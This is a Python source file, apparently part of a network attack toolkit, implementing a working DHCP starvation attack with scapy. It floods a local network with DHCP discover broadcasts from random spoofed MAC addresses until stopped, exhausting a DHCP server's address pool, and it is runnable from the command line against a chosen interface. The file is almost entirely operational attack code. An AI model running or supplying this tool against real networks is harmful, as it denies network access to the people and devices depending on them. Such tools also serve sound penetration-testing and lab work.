from scapy.all import Ether, IP, BOOTP, DHCP, UDP, hexdump, sendp
import time
from src.envena.functions import rand_eth
from random import uniform, randint
from src.envena.base.tool import Tool
from src.envena.base.arguments import Arguments
from src.modules.ethernet.ip.udp.dhcp import DHCPPacket, DHCPPacketType

def dhcp_starve(param, logger)->None:
    
    if param.timeout == None:
        param.timeout = 0.5
    
    sent_packets = 0
    # print(f'DHCP-starvation attack module, version {dhcp_starve_v}')
    try:
        # print('*DHCP-starve started. Ctrl+C to stop')
        eth_src=rand_eth()
        hexdump(Ether(dst='ff:ff:ff:ff:ff:ff', src=eth_src)/
            IP(src='0.0.0.0', dst='255.255.255.255')/
            UDP(sport=68, dport=67)/
            BOOTP(
                op=1,  # BOOTREQUEST
                htype=1,  # Ethernet
                hlen=6,  # Длина MAC-адреса
                xid=randint(0, 0xFF_FF_FF_FF),  # Случайный ID транзакции
                chaddr=bytes.fromhex(eth_src.replace(":", "")),  # MAC в бинарном формате
                flags=0x8000  # Broadcast флаг
            )/
            DHCP(options=[
                ('message-type', 'discover'),
                ('param_req_list', [1, 3, 6, 15, 31, 33]),  # Стандартные параметры
                'end'
            ])
        )
        while True:
            eth_src=rand_eth()
            ether = Ether(dst='ff:ff:ff:ff:ff:ff', src=eth_src)
            ip = IP(src='0.0.0.0', dst='255.255.255.255')
            udp = UDP(sport=68, dport=67)
            bootp = BOOTP(
                op=1,  # BOOTREQUEST
                htype=1,  # Ethernet
                hlen=6,  # MAC length
                xid=randint(0, 0xFFFFFFFF),  # Random XID
                chaddr=bytes.fromhex(eth_src.replace(":", "")),  # MAC in bin format
                flags=0x8000  # Broadcast
            )
            dhcp = DHCP(options=[
                ('message-type', 'discover'),
                ('param_req_list', [1, 3, 6, 15, 31, 33]),  # Base parameters
                'end'
            ])
            
            packet = ether/ip/udp/bootp/dhcp
            
            # Send packet
            try:
                sendp(packet, iface=param.iface, verbose=False)
                logger.info(f"{sent_packets}... Sent DHCP-discover from MAC: {eth_src}")
                sent_packets += 1
            except Exception as e:
                logger.error(f"Packet was not sent: {e}")
            time.sleep(round(uniform(0, param.timeout), 3))  # 0.5 is optimal
    except KeyboardInterrupt:
        logger.info(f"{sent_packets} packet(s) sent")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description=f"DHCP-starvation attack module")
    parser.add_argument("-i", "--iface", required=True, help="network interface")
    cli_args = parser.parse_args()
    
    args=Arguments()
    
    args.iface = cli_args.iface
    
    dhcp_starvation = Tool(tool_func=dhcp_starve, VERSION=1.0, args=args)
    dhcp_starvation.start_tool()